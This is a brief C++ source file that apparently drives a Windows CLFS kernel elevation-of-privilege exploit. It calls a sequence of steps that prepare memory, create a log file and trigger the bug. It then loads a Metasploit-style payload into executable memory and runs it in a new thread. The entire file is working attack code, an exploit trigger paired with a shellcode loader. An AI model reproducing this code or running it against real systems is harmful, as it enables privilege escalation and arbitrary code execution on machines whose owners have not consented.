#pragma once
#include "common.h"
#include "clfs_eop.h"
#include "exploit.h"
#include <tchar.h>

void ExecutePayload(PMSF_PAYLOAD pMsfPayload) {
	if (!pMsfPayload)
		return;
	PVOID pPayload = VirtualAlloc(NULL, pMsfPayload->dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pPayload)
		return;
	CopyMemory(pPayload, &pMsfPayload->cPayloadData, pMsfPayload->dwSize);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pPayload, NULL, 0, NULL);
}


DWORD Exploit(PMSF_PAYLOAD pPayload) {

	clfs_eop ce = clfs_eop::clfs_eop();

	ce.getVirtualAddress();
	ce.InitEnvironment();
	ce.doFirstAlloc();
	ce.createInitialLogFile();
	ce.fun_prepare();
	ce.to_trigger();

	ExecutePayload(pPayload);

	return 0;
}